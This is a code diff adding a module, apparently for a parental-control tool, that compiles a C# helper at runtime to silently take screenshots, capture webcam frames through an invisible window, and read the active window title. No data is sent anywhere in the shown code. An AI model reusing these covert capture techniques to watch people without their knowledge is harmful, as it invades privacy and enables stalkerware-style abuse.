@@ -1,0 +1,91 @@
+use file
+use process
+
+let NATIVE_EXE = "KidsControlNative.exe"
+
+# Compiles the high-performance C# helper on startup if missing.
+fn setupNativeHelper()
+    if file.isFile(NATIVE_EXE) return end
+    let csCode = `using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+using System.Threading;
+
+class KidsControlNative {
+    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+    [DllImport("avicap32.dll")] static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, IntPtr hwndParent, int nID);
+    [DllImport("user32", EntryPoint="SendMessage")] static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+
+    [STAThread]
+    static void Main(string[] args) {
+        if (args.Length == 0) return;
+        string cmd = args[0].ToLower();
+        if (cmd == "window") {
+            IntPtr hwnd = GetForegroundWindow();
+            StringBuilder sb = new StringBuilder(256);
+            if (GetWindowText(hwnd, sb, 256) > 0) Console.WriteLine(sb.ToString());
+            else Console.WriteLine("None/Desktop");
+        } else if (cmd == "screenshot") {
+            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
+                using (Graphics g = Graphics.FromImage(bmp)) {
+                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
+                }
+                using (Image thumb = bmp.GetThumbnailImage(bounds.Width / 2, bounds.Height / 2, null, IntPtr.Zero)) {
+                    using (MemoryStream ms = new MemoryStream()) {
+                        thumb.Save(ms, ImageFormat.Jpeg);
+                        Console.WriteLine(Convert.ToBase64String(ms.ToArray()));
+                    }
+                }
+            }
+        } else if (cmd == "webcam") {
+            IntPtr hwnd = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
+            SendMessage(hwnd, 1034, 0, 0); Thread.Sleep(800);
+            SendMessage(hwnd, 1084, 0, 0); SendMessage(hwnd, 1054, 0, 0); SendMessage(hwnd, 1035, 0, 0);
+            if (Clipboard.ContainsImage()) {
+                using (Image img = Clipboard.GetImage()) {
+                    using (MemoryStream ms = new MemoryStream()) {
+                        img.Save(ms, ImageFormat.Jpeg);
+                        Console.WriteLine(Convert.ToBase64String(ms.ToArray()));
+                    }
+                }
+                Clipboard.Clear();
+            } else Console.WriteLine("NO_WEBCAM");
+        }
+    }
+}
+`
+    let csFile = "NativeHelper.cs"
+    file.write(csFile, csCode)
+    let csc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+    process.exec(csc + " /out:" + NATIVE_EXE + " /r:System.Windows.Forms.dll /r:System.Drawing.dll " + csFile)
+    try file.delete(csFile) catch e end
+end
+
+# @return {string} Base64 image data prefixed with SCREENSHOT:
+fn takeScreenshot()
+    setupNativeHelper()
+    let r = process.exec(NATIVE_EXE + " screenshot")
+    return "SCREENSHOT:" + r["stdout"].strip()
+end
+
+# Captures a webcam image and returns it as a base64 string.
+# @return {string} Base64 image data prefixed with WEBCAM:
+fn takeWebcamSnapshot()
+    setupNativeHelper()
+    let r = process.exec(NATIVE_EXE + " webcam")
+    return "WEBCAM:" + r["stdout"].strip()
+end
+
+# Gets the title of the currently active window on the machine.
+# @return {string} Window title prefixed with ACTIVE_WINDOW:
+fn getActiveWindow()
+    setupNativeHelper()
+    let r = process.exec(NATIVE_EXE + " window")
+    return "ACTIVE_WINDOW:" + r["stdout"].strip()
+end
